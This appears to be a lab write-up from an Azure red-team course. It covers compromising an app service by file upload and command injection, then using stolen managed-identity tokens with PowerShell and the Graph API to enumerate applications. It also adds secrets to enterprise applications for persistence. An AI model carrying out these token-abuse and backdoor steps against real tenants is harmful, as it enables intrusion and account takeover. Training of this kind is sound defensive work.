## Objective 12 ***Part of - Kill Chain - 3***


```
- An application in the defcorphq tenant (https://virusscanner.azurewebsites.net) is vulnerable to insecure file upload and OS command injection. Compromise the app service.
- Check if the service principal for the managed identity of the compromised application has any interesting permissions on other Azure resources.
```
- After uploading *.zip file end OS command injection vulnerabilities retrive the Access token and graph token
![test](/img/obj12.png "Enumeration")


- Use both the tokens and Client ID with Az PowerShell and check the resources:
```powershell
$token = 'eyJ0eX..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
```

- List resources that we have access to:
```powershell
Get-AzResource
```
The below error means that the managed identity has no rights on any of the Azure resources
![test](/img/obj121.png "Enumeration")

- Use the Graph API token with the REST API to list all Enterprise Applications in the defcorphq tenant:
```powershell
$Token = 'eyJ0eX..'
$URI = ' https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod @RequestParams).value
```

**We should be able to list roles assigned to the enterprise applications by calling the API**
`https://graph.microsoft.com/v1.0/servicePrincipals/{ID}/appRoleAssignments`

- Use the Add-AzADAppSecret.ps1 from the Tools directory. It **tries to add a secret (application password) to all the enterprise applications and shows the successful** ones:
```powershell
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```
![test](/img/obj122.png "Enumeration")